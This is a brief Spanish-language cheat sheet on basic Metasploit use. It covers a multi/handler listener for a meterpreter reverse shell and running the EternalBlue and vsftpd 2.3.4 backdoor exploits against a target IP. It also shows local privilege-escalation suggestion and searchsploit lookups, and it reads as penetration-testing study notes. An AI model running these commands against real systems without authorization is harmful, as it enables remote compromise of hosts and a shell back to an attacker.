# Metasploit Basico

Metasploit Framework permite explotar vulnerabilidades de forma automatizada.

## Uso del Multi/Handler

El modulo `multi/handler` recibe conexiones de payloads generados con msfvenom.

```bash
msfconsole

use exploit/multi/handler
show options

set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <IP_atacante>
set LPORT <puerto>
run
```

> El LHOST y LPORT deben coincidir con los usados al generar el payload con msfvenom.

## Explotacion de EternalBlue (MS17-010)

Vulnerabilidad critica en SMBv1 de Windows, usada por ransomware como WannaCry.

```bash
msfconsole

search eternalblue
use 0
show options
set RHOSTS <IP_objetivo>
run
```

## Explotacion de vsftpd 2.3.4

Version de vsftpd con backdoor conocido en el puerto 21.

```bash
msfconsole

search vsFTPd 2.3.4
use 0
show options
set RHOSTS <IP_objetivo>
run
```

## Local Exploit Suggester

Una vez tenemos una sesion de meterpreter, podemos buscar exploits de escalada de privilegios.

```bash
background       #Ctrl+Z
search local_exploit_suggester
show options
sessions -l
set SESSION 1
run
```

> Los exploits sugeridos deben probarse uno a uno.


## Searchsploit

Permite buscar exploits conocidos en la base de datos de Exploit-DB a partir del nombre de un software, servicio, versión o vulnerabilidad identificada durante la enumeración.

```cmd
searchsploit <posible_vulnerabilidad>
```

Ejemplo: 

```
searchsploit samba 3.0.20
```

Una vez identificado el exploit de interés, puede copiarse al directorio actual para su análisis:

```
searchsploit -m <numero_identificador_Path>
```

Visualizar el contenido del exploit:

```
cat <ruta/del/archivo>
```